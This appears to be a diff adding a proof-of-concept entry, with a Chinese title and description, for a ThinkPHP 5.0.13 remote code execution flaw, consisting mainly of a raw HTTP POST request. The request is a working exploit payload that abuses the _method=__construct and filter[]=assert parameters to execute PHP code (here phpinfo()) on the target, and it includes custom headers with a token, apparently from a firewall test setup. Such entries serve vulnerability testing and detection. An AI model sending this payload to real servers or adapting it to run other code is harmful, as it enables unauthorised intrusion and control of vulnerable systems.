@@ -1,0 +1,11 @@
+# ThinkPHP5.0.13远程代码执行漏洞
+# ThinkPHP 5.0.13易于远程代码执行。攻击者可以执行恶意软件，获取敏感信息，修改数据，和/或在不输入必要的凭据的情况下获得对受损系统的完全控制。
+POST /?s=index/index/index&acid=30000505&bid=hd_tag_m8mv23o4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23o4
+RM-PRO-Token: 6644bf77bf1875503ea6f90b8200702f
+RM-PRO-Time: 1742808333147
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+s=phpinfo()&_method=__construct&filter[]=assert
